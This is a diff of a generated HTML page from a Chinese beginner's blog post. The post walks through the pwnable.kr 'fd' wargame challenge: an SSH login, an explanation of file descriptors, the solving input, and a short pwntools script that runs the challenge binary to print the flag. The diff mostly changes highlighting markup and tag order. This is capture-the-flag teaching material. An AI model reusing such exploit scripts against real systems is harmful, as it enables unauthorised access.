@@ -206,9 +206,9 @@
 </blockquote>
 <h2 id="PWN入门第一式"><a href="#PWN入门第一式" class="headerlink" title="PWN入门第一式"></a>PWN入门第一式</h2><h3 id="准备活动"><a href="#准备活动" class="headerlink" title="准备活动"></a>准备活动</h3><p>熟话说，欲先善其事，必先利其器.<br>请观看<a href="https://etenal.me/archives/972">ETenal</a>大佬的笔记来搭建环境.</p>
 <h3 id="在Play-Game刷的第一题"><a href="#在Play-Game刷的第一题" class="headerlink" title="在Play Game刷的第一题."></a>在<a href="http://pwnable.kr">Play Game</a>刷的第一题.</h3><p>萌新的我点开 fd 那个萌萌的粉红史莱姆.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what <span class="keyword">is</span> a <span class="keyword">file</span> descriptor <span class="keyword">in</span> Linux?</span><br><span class="line"></span><br><span class="line">* <span class="keyword">try</span> <span class="keyword">to</span> play the wargame your self but <span class="keyword">if</span> you are <span class="keyword">ABSOLUTE</span> beginner, follow this tutorial link: https:<span class="comment">//www.youtube.com/watch?v=blAxTfcW9VU</span></span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
 <p>我们在ubuntu上输入,然后输入 密码 guest.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mzl@ubuntu:~$ ssh fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr&apos;s password: </span><br><span class="line">____  __    __  ____    ____  ____   _        ___      __  _  ____</span><br><span class="line">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ </span><br><span class="line">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &apos; / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / </span><br><span class="line">|  |  |  `  &apos;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ </span><br><span class="line">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span><br><span class="line">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span><br><span class="line">                                                                     </span><br><span class="line">- Site admin : daehee87.kr@gmail.com</span><br><span class="line">- IRC : irc.netgarage.org:6667 / #pwnable.kr</span><br><span class="line">- Simply type &quot;irssi&quot; command to join IRC now</span><br><span class="line">- files under /tmp can be erased anytime. make your directory under /tmp</span><br><span class="line">- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal</span><br><span class="line">Last login: Sat Mar  3 23:53:04 2018 from *.*.*.*</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mzl<span class="meta">@ubuntu:~$</span> ssh fd<span class="meta">@pwnable.kr</span> -p2222</span><br><span class="line">fd<span class="meta">@pwnable.kr's</span> password: </span><br><span class="line">____  __    __  ____    ____  ____   _        ___      __  _  ____</span><br><span class="line">|<span class="string">    \</span>|<span class="string">  </span>|<span class="string">__</span>|<span class="string">  </span>||<span class="string">    \  /    </span>||<span class="string">    \ </span>|<span class="string"> </span>|<span class="string">      /  _]    </span>|<span class="string">  </span>|<span class="string">/ ]</span>|<span class="string">    \ </span></span><br><span class="line">|<span class="string">  o  )  </span>|<span class="string">  </span>|<span class="string">  </span>||<span class="string">  _  </span>||<span class="string">  o  </span>||<span class="string">  o  )</span>|<span class="string"> </span>|<span class="string">     /  [_     </span>|<span class="string">  ' / </span>|<span class="string">  D  )</span></span><br><span class="line">|<span class="string">   _/</span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">  </span>||<span class="string">  </span>|<span class="string">  </span>||<span class="string">     </span>||<span class="string">     </span>||<span class="string"> </span>|<span class="string">___ </span>|<span class="string">    _]    </span>|<span class="string">    \ </span>|<span class="string">    / </span></span><br><span class="line">|<span class="string">  </span>|<span class="string">  </span>|<span class="string">  `  '  </span>||<span class="string">  </span>|<span class="string">  </span>||<span class="string">  _  </span>||<span class="string">  O  </span>||<span class="string">     </span>||<span class="string">   [_  __ </span>|<span class="string">     \</span>|<span class="string">    \ </span></span><br><span class="line">|<span class="string">  </span>|<span class="string">   \      / </span>|<span class="string">  </span>|<span class="string">  </span>||<span class="string">  </span>|<span class="string">  </span>||<span class="string">     </span>||<span class="string">     </span>||<span class="string">     </span>||<span class="string">  </span>||<span class="string">  .  </span>||<span class="string">  .  \</span></span><br><span class="line">|<span class="string">__</span>|<span class="string">    \_/\_/  </span>|<span class="string">__</span>|<span class="string">__</span>||<span class="string">__</span>|<span class="string">__</span>||<span class="string">_____</span>||<span class="string">_____</span>||<span class="string">_____</span>||<span class="string">__</span>||<span class="string">__</span>|<span class="string">\_</span>||<span class="string">__</span>|<span class="string">\_</span>|</span><br><span class="line">                                                                     </span><br><span class="line">- Site admin : daehee87.kr<span class="meta">@gmail.com</span></span><br><span class="line">- IRC : irc.netgarage.org:6667 / <span class="comment">#pwnable.kr</span></span><br><span class="line">- Simply type <span class="string">"irssi"</span> command to join IRC now</span><br><span class="line">- files under /tmp can be erased anytime. make your directory under /tmp</span><br><span class="line">- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal</span><br><span class="line">Last login: Sat Mar  3 23:53:04 2018 from <span class="symbol">*</span>.<span class="symbol">*</span>.<span class="symbol">*</span>.<span class="symbol">*</span></span><br></pre></td></tr></table></figure>
 <p>首先我们来看一下都有些啥文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ls -l</span><br><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br></pre></td></tr></table></figure>
 <p>然后我们发现只有 fd.c 一个入口</p>
@@ -216,7 +216,7 @@
 <p>函数:<br>atoi (表示 ascii to integer)是把字符串转换成整型数的一个函数.<br>strcmp(char<em> str1, char</em> str2) 若 str1 和 str2 字符串相同返回0.</p>
 <p>重要函数：read | ssize_t read(int fd,void * buf ,size_t count);<br>参数说明<br>fd 的值有三种(都为int类型)<br>当fd=0, read函数为标准输入流, 其他参数时, 1(标准输出流), 2(标准错误流).<br>buf所指向的内存可以比喻为流的载具, count为载具的容量.<br>务必再百度关键词 <a href="https://en.wikipedia.org/wiki/File_descriptor">file descriptor</a>, 查看官方描述.</p>
 <p>所以我们需要让read为标准输入, 即使 fd=0, 又因为 fd = (输入的值) - 0x1234(转换为十进制为4660).故输入 4660, 然后再输入 LETMEWIN 再回车即可.演示如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>./fd <span class="number">4660</span></span><br><span class="line">LETMEWIN</span><br><span class="line">good job <span class="symbol">:</span>)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
 <p>最后来一个python的exploit<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pwn_ssh=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'fd'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line"><span class="keyword">print</span> (pwn_ssh.connected())</span><br><span class="line">sh=pwn_ssh.process(argv=[<span class="string">'fd'</span>,<span class="string">'4660'</span>],executable=<span class="string">'./fd'</span>)</span><br><span class="line">sh.sendline(<span class="string">"LETMEWIN"</span>)</span><br><span class="line"><span class="keyword">print</span> (sh.recvall())</span><br></pre></td></tr></table></figure></p>
 
       
@@ -489,107 +489,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">模板</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">JSP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">基础</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">MIPS汇编</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Maven</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">编码</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">编程</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工具</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CURL</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">install</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">安装</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">配置</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">docker</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">扫描</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">内网</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">MYSQL</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">二进制</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">question</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">小文</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -601,7 +501,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+                <a href="javascript:void(0)" class="js-tag color3">工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CURL</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -610,6 +514,78 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">MIPS汇编</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">MYSQL</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Maven</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">编程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">模板</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">docker</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">扫描</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">二进制</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">小文</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">编码</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">question</a>
               </li>
             
             <div class="clearfix"></div>
